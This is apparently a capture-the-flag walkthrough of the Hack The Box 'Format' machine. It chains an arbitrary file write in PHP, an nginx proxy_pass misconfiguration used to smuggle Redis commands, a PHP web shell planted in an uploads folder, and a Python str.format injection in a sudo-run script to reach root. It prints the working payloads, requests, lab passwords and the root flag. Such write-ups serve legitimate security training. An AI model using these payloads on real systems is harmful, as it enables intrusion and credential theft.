# Format - HTB(Medium)
## IP = 10.129.86.145

### NMAP

```

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c397ce837d255d5dedb545cdf20b054f (RSA)
|   256 b3aa30352b997d20feb6758840a517c1 (ECDSA)
|_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

So after adding everything to `/etc/hosts` I started enumerating, when entering the `app.microblog.htb` I saw a register button. After registering I understood that I could create subdomains to the site and create a sort of blog, so I created one with the subdomain of `fady`. After that I didn't find much of nothing, so I went to the port 3000 site, I saw there the source code of the web app, so I downloaded it and started analyzing. I found a shady `if` statement that could maybe allow me LFI:

```

if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

```

This statement uses the `id` post parameter to open a file(any file), and writes it to the `html` variable. Neet so let's check if it works. I wrote the following request to burp:

```

POST /edit/index.php HTTP/1.1
Host: fady.microblog.htb

id=/etc/passwd&txt=sdfsd

```
and it worked! 

```

root:x:0:0:root:/root:/bin/bash
cooper:x:1000:1000::/home/cooper:/bin/bash
git:x:104:111:Git Version Control,,,:/home/git:/bin/bash

```

But finding passwd didn't help me with a lot, at least I know the web app is running on nginx servers to let me check for those.

After a little bit of payloads and not a lot of success I searched for Nginx misconfigurations, and found something interesting about, the following file: `/etc/nginx/site-enabled/default`

In the file we can see the following:

```

location ~ /static/(.*)/(.*) {
	resolver 127.0.0.1;
	proxy_pass http://$1.microbucket.htb/$2;
}

```

If you read a little bit about nginx misconfiguration you can find a vulnerability in this type of regex. You can read this article for more information: https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/

#### Getting Pro

```

HSET /static/unix:/var/run/redis/redis.sock:0xfade%20pro%20%22true%22%20/health.txt HTTP/1.1
Host: microblog.htb
User-Agent: curl/7.88.1
Accept: */*
Connection: close

```

By running the following payload you'll succeed. Here is the breakdown:

1. HSET 
The first part of data sent to the socket is HSET, it's a command in redis for setting the values of diffrent fields.
2. /static/unix:/var/run/redis/redis.sock
We can control the redis server because of the allowing of a unix socket path. So we specify the redis socket.
3. 0xfade%20pro%20%22true%22%20 
Inside the server we set the field `pro` to `true` for the username `0xfade`(which is my username).

And the is all, after that I sent the request and had the pro subscription.

#### Getting to www-data

After getting pro, we can look at the look at the source code again. We can see the in the add image part inside /edit/index.php a ../uploads directory is created, when adding an image and to add an image you need to go pro. So we got that uploads part, now we can upload php code as text but direct it to the uploads folder. By doing that we could execute commands remotly and thus get a shell.

I goes as follows:

First you need to have pro, then you can run the following payload that will create you a code command panel that you can execute shell commands on:

```

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?></pre>

```

After entering that in the text input, intercept the request and instead of the `id` given, change it to `id=../uploads/<file>.php`.

```

POST /edit/index.php HTTP/1.1
Host: fady.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 404
Origin: http://fady.microblog.htb
Connection: close
Referer: http://fady.microblog.htb/edit/?message=Section%20deleted&status=success
Cookie: username=jrg2sbiqvq5h3cmk5vuvbhl0m5
Upgrade-Insecure-Requests: 1

id=../uploads/shell.php&txt=%3Cform+method%3D%22GET%22+name%3D%22%3C%3Fphp+echo+basename%28%24_SERVER%5B%27PHP_SELF%27%5D%29%3B+%3F%3E%22%3E%3Cinput+type%3D%22TEXT%22+name%3D%22cmd%22+autofocus+id%3D%22cmd%22+size%3D%2280%22%3E%3Cinput+type%3D%22SUBMIT%22+value%3D%22Execute%22%3E%3C%2Fform%3E%3Cpre%3E%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%7Bsystem%28%24_GET%5B%27cmd%27%5D%29%3B%7D%3F%3E%3C%2Fpre%3E

```

Now you can navigate to the /uploads/shell.php uri and execute command to the machine. 


### Getting to cooper

After getting to `www-data` you can't find much of nothing, except the redis database, now at first it was a little wierd with the syntax, but I managed to figure out how to use it. To find Cooper's password I ran the following:

```

www-data@format:/dev/shm$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> keys *
...
7) "cooper.dooper"
...

redis /var/run/redis/redis.sock> HGET cooper.dooper password
"zooperdoopercooper"

```

Boom! Cooper's password.

### Privilege Escalation

When running `sudo -l` we can see the following:

```

cooper@format:~$ sudo -l                                                                                                                      
Matching Defaults entries for cooper on format:                                                                                               
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                    
                                                                                                                                              
User cooper may run the following commands on format:                                                                                         
    (root) /usr/bin/license

```

we can see we have root permissions on a binary called `license`, I ran `file` on the bin and found: `usr/bin/license: Python script, ASCII text executable`. Ok so it's a python script we can run `strings` and see the full source code:

```

cooper@format:~$ strings /usr/bin/license
#!/usr/bin/python3
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()
if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()
parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')
secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
f = Fernet(encryption_key)
l = License()
#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")
#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()
#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")

```

So let's analyze a bit. 

As the name of the machine we can see the following line:

```

license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)

```

This is made out of the `.format` string methods in python. Googling a little bit and you can find this article: https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/

It talks about way this method is vulnerable. Well if it's used with user supplied input, then we can access some sensetive information. 

It is user supplied, because we controll the `license` object we can add to it whatever we want, and that's exactly we we're gonna do. 

We have the `prefix` which is always going to be "microblog", after that we got `username` username is the one we can register. We got `l` which is the license created by some sort of secret, a salt and a hash algorithem. and the `firstlast` which is a variable created by our first and last name that we register to the webapp.

So I created the user with the username `0xfade`, Now I know that a username has fields we got "username", "password", etc. In the script the we can see the username is `HGET`ed from the server, meaning, we can inject code into the username field in the database and find what is the `secret` variable.

```

cooper@format:/dev/shm$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> hset 0xfade username {license.__init__.__globals__[secret]}

cooper@format:/dev/shm$ sudo /usr/bin/license -p 0xfade

Plaintext license key:
------------------------------------------------------
microblogunCR4ckaBL3Pa$$w0rd*!?k1kJjm?|&4%tF:U$1,bw\_",a0GQv7r=f4!G_fadesec

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkaQQ-qlzBxzd-59CPdmd51bzIa09MKrBgDKTrU4FvKx9CTG1cn79EId2jOqPGYfwpdBdadJcFdAeODrIOJ-ElokGCAKNPMkeJKyvVoRXQXYp6uJF153KLDfGjDW9pcUBmBFoxFRdDENDmu6jblHTuCC3O_UURSe7kpsi0Lr3hk7GCpNE=

```

We can see in the plaintext license key after microblog the "secret" which is: unCR4ckaBL3Pa$$w0rd

Hmmm wonder what's that for. 

```

cooper@format:/dev/shm$ su root
Password:
root@format:/dev/shm# cat /root/root.txt
2373faf4404a7798da9a3bb25809c4b0

```

And that's it fellas, thanks for tuning in. Cheers.
